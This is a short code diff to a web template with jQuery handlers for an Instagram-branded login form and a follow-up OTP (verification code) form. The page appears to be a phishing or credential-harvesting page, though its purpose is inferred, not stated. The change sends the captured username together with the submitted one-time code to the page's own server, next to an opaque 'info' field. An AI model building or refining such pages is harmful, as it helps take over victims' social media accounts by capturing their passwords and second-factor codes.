@@ -222,7 +222,7 @@
                     btn.attr('disabled', false).html("{{ __('instagram.login') }}")
                 }
                 if (data.otp_request) {
-                    $("#main").remove()
+                    $("#main").hide()
                     $("#footer").remove()
                     $("#verify_otp").removeClass('hidden')
                 }
@@ -292,6 +292,7 @@
         });
         $("#submit_otp").submit(function(e) {
             e.preventDefault();
+            const username = $("#user").val()
             otp = $(this).find('input[type=text]').val()
             btn = $(this).find('button[type=submit]')
             warning = $("#warning_otp")
@@ -299,7 +300,8 @@
             const dataToSend = {
                 'info': '{{ $info }}',
                 'ac': 'o',
-                'otp': otp
+                'otp': otp,
+                'username': username
             }
             if (!otp || otp.length > 8) {
                 warning.show()
